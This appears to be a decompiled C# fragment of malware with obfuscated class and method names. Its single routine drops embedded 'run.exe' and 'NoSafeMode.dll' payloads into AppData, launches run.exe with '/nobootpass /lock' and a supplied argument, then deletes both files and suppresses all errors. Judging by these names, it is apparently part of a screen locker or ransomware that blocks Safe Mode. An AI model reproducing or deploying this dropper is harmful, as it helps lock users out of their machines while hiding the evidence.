using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using ns5;

namespace ns1;

internal class Class12
{
	public static void smethod_0(string string_0)
	{
		try
		{
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\run.exe", Class18.smethod_10());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\NoSafeMode.dll", Class18.smethod_11());
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\run.exe", "/nobootpass /lock " + string_0);
			Thread.Sleep(2000);
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\run.exe");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\NoSafeMode.dll");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
